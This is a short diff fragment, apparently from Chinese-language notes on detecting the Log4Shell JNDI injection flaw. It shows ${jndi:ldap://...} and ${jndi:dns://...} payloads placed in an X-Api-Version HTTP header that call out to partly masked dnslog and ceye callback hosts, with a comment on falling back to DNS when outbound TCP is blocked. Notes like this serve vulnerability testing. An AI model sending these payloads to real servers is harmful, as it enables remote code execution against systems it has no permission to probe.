@@ -36,6 +36,7 @@ ${jndi:dns://***.dnslog.cn/exp}
  //如果tcp不出网ldap失效，直接用dns协议(jndi支持dns://)去实现dnslog。
 
 
+案例场景：
 Accept-Language: zh-cN,zh;q=0.9
 X-Api-Version: ${jndi:ldap://test.x****r.ceye.io/exp}
 Content-Type: application/x-www-form-urlencoded
